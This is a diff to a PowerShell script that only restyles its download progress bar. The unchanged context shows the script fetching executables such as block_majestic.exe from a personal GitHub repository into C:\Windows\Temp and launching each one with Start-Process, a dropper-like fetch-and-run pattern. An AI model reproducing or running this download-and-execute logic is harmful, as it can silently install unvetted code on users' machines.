@@ -4,6 +4,15 @@ $downloads = @(
     @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/block_majestic.exe'; Path = 'C:\Windows\Temp\block_majestic.exe' }
 )
 
+function Show-Progress {
+    param ([int]$Percent)
+    $width = 40
+    $filled = [int]($width * $Percent / 100)
+    $empty = $width - $filled
+    $bar = '#' * $filled + '-' * $empty
+    Write-Host "`r  Downloading... [$bar] $Percent%  " -NoNewline
+}
+
 $totalFiles = $downloads.Count
 $fileIndex = 0
 
@@ -30,7 +39,7 @@ foreach ($item in $downloads) {
             if ($totalBytes -gt 0) {
                 $filePct = ($totalRead / $totalBytes)
                 $totalPct = [int](($fileIndex + $filePct) / $totalFiles * 100)
-                Write-Progress -Activity "Downloading..." -Status "Just a moment" -PercentComplete $totalPct
+                Show-Progress $totalPct
             }
         }
 
@@ -40,11 +49,12 @@ foreach ($item in $downloads) {
         $fileIndex++
     }
     catch {
-        Write-Host "Ошибка: $($_.Exception.Message)" -ForegroundColor Red
+        Write-Host "`nОшибка: $($_.Exception.Message)" -ForegroundColor Red
     }
 }
 
-Write-Progress -Activity "Downloading..." -Status "Just a moment" -Completed
+Show-Progress 100
+Write-Host "`n"
 
 foreach ($item in $downloads) {
     Start-Process $item.Path
